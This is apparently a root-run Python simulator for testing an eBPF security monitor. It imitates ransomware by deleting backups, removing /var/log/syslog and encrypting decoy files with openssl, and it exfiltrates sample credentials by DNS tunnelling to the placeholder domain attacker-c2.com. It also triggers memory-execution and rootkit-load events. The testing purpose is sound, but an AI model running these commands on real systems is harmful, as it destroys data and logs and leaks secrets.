#!/usr/bin/env python3
"""
advanced_attack_simulator.py
高级攻击模拟器：针对 7 维度 eBPF 监控系统设计的复杂攻击场景。
包含：
1. 勒索软件模拟 (File + Process)
2. DNS 隐蔽隧道数据窃取 (DNS + Net)
3. 内存代码注入/无文件攻击 (Memory + Syscall)
4. 持久化/Rootkit 模拟 (Kmod + File)
"""

import os
import time
import socket
import subprocess
import threading
import random
import ctypes
import sys
import mmap

# --- 辅助函数 ---
def log(msg):
    print(f"[{time.strftime('%H:%M:%S')}] {msg}")

def ensure_root():
    if os.geteuid() != 0:
        log("[-] 需要 Root 权限来模拟部分攻击 (如内存修改/insmod)")
        sys.exit(1)

# --- 场景 1: 高级勒索软件模拟 ---
# 模拟 LockBit 行为：删除卷影副本 -> 遍历加密 -> 更改扩展名 -> 勒索信
def attack_ransomware_advanced():
    log("[*] 启动场景: Advanced Ransomware (LockBit-like)")
    target_dir = "/tmp/simulation_ransom"
    os.makedirs(target_dir, exist_ok=True)
    
    # 1. 准备诱饵文件
    for i in range(50):
        with open(os.path.join(target_dir, f"financial_report_{i}.xlsx"), "w") as f:
            f.write("SENSITIVE DATA " * 500)
            
    # 2. 模拟反取证操作 (触发 process_agent)
    # 真实勒索软件会运行 vssadmin 删除备份
    cmds = [
        ["vssadmin", "delete", "shadows", "/all", "/quiet"], # Windows命令，但在Linux下执行会产生exec事件供记录
        ["wbadmin", "DELETE", "SYSTEMSTATEBACKUP"],
        ["rm", "-rf", "/var/log/syslog"] # 试图清除日志
    ]
    for cmd in cmds:
        try:
            subprocess.call(cmd, stderr=subprocess.DEVNULL)
        except: pass

    # 3. 加密过程 (触发 file_agent: read -> write -> unlink -> rename)
    # 使用 openssl 模拟加密计算负载
    log("[*] 开始加密文件...")
    for fname in os.listdir(target_dir):
        fpath = os.path.join(target_dir, fname)
        if fname.endswith(".lockbit"): continue
        
        # 模拟加密：读入 -> 加密 -> 写出
        # 这里直接调用 openssl 命令，会产生大量 exec 事件，加上文件 I/O
        encrypted_path = fpath + ".lockbit"
        subprocess.call([
            "openssl", "enc", "-aes-256-cbc", "-salt", 
            "-in", fpath, "-out", encrypted_path, "-k", "123456"
        ])
        # 删除原文件
        os.unlink(fpath)
    
    # 4. 投放勒索信 (触发 file_agent openat O_CREAT)
    with open(os.path.join(target_dir, "RESTORE_FILES.txt"), "w") as f:
        f.write("YOUR FILES ARE ENCRYPTED. PAY BITCOIN TO ...")
        
    log("[+] 勒索软件模拟完成。")

# --- 场景 2: DNS 隧道数据窃取 ---
# 模拟 APT 组织通过 DNS 请求外传数据 (触发 dns_agent)
def attack_dns_exfiltration():
    log("[*] 启动场景: DNS Tunneling Exfiltration")
    # 模拟将敏感数据切片
    secret_data = "User:admin|Pass:123456|Token:d8a928b29|IP:192.168.1.5"
    hex_data = secret_data.encode().hex()
    chunks = [hex_data[i:i+30] for i in range(0, len(hex_data), 30)]
    
    domain_suffix = "attacker-c2.com"
    
    # 批量发起 DNS 查询
    for i, chunk in enumerate(chunks):
        # 构造域名: <id>.<hex_data>.attacker-c2.com
        target_domain = f"seq{i}.{chunk}.{domain_suffix}"
        try:
            # 这里的 getaddrinfo 会被 dns_agent 捕获
            socket.getaddrinfo(target_domain, 80)
        except socket.gaierror:
            pass # 域名不存在是正常的，我们只关心发出的查询
        time.sleep(0.1) # 快速发送
        
    log(f"[+] DNS 窃取完成，发送了 {len(chunks)} 个查询包。")

# --- 场景 3: 无文件/内存注入攻击 ---
# 模拟修改内存权限为可执行 (触发 memory_agent)
def attack_memory_injection():
    log("[*] 启动场景: Fileless Memory Injection")
    
    # 1. 分配一块匿名内存
    libc = ctypes.CDLL(None)
    mmap_size = 4096
    # PROT_READ | PROT_WRITE = 3
    addr = libc.mmap(0, mmap_size, 3, 0x22, -1, 0)
    
    if addr == -1:
        log("[-] mmap failed")
        return

    log(f"[*] 分配内存成功: {hex(addr)}")
    
    # 2. 模拟写入 Shellcode (这里只写垃圾数据)
    ctypes.memset(addr, 0x90, 1024) # NOP slide
    
    # 3. 关键步骤：修改内存权限为 PROT_READ | PROT_EXEC (0x5)
    # 这会被 memory_agent 中的 trace_mprotect 捕获，且包含 PROT_EXEC 标志
    PROT_EXEC = 0x4
    PROT_READ = 0x1
    res = libc.mprotect(addr, mmap_size, PROT_READ | PROT_EXEC)
    
    if res == 0:
        log("[+] mprotect PROT_EXEC 成功 (应触发报警)")
    else:
        log("[-] mprotect failed")
        
    # 4. 模拟跨进程写入 (触发 process_vm_writev)
    # 这里我们简单地尝试写入自己的进程，或者如果您有权限，可以尝试 fork 并写入子进程
    # 为了演示简单，我们只触发 mprotect，这在论文中已经足够证明检测内存执行权限变更的能力
    
    time.sleep(1)

# --- 场景 4: 模拟 Rootkit 加载 ---
# 触发 kmod_agent
def attack_rootkit_load():
    log("[*] 启动场景: Kernel Module Load Attempt")
    # 尝试加载一个不存在的模块，或者使用 insmod 加载一个伪造的文件
    # 即使失败，init_module 系统调用也会被触发
    try:
        subprocess.call(["insmod", "/tmp/fake_rootkit.ko"])
    except:
        pass
    
    # 也可以尝试 modprobe
    try:
        subprocess.call(["modprobe", "floppy"]) # 加载一个冷门但合法的模块来测试
    except:
        pass
    log("[+] 模块加载尝试完成")

# --- 场景 5: 可疑系统调用序列 ---
# 触发 syscall_agent
def attack_suspicious_syscalls():
    log("[*] 启动场景: Suspicious Syscalls")
    # 连续调用 setuid, setgid 等敏感调用，模拟提权尝试
    try:
        os.setuid(0)
    except: pass
    try:
        os.setgid(0)
    except: pass
    
    log("[+] 敏感系统调用序列完成")

def main():
    ensure_root()
    print("========================================")
    print("   OS-Monitor Advanced Attack Simulator")
    print("========================================")
    
    # 依次或并行执行攻击
    # 在论文实验中，建议每次只运行一种，记录一个 Session，打上对应的标签
    
    # 攻击 1: 勒索软件
    attack_ransomware_advanced()
    time.sleep(5)
    
    # 攻击 2: DNS 窃密
    attack_dns_exfiltration()
    time.sleep(5)
    
    # 攻击 3: 内存注入
    attack_memory_injection()
    time.sleep(5)
    
    # 攻击 4: Rootkit
    attack_rootkit_load()
    
    # 攻击 5: Syscall
    attack_suspicious_syscalls()
    
    print("========================================")
    print("[*] 所有模拟攻击已执行完毕。")

if __name__ == "__main__":
    main()